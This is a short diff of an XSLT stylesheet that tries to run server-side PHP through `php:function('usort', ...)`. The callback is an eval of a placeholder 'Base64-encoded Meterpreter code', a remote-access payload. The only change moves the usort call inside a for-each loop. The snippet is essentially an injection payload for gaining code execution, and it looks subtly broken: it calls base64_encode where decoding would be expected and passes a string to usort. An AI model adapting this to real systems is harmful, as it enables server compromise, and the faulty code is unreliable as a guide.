@@ -4,8 +4,8 @@
                  <xsl:variable name="eval">
                           eval(base64_encode('Base64-encoded Meterpreter code'))
                    </xsl:variable>
-                  
-                   <xsl:variable name="preg" select="php:function('usort', string(path/element/text()), $eval)"/>
-                 
+                  <xsl:for-each select="element">
+                   <xsl:variable name="preg" select="php:function('usort', string(@name), $eval)"/>
+                 </xsl:for-each>
          </xsl:template>
   </xsl:stylesheet>
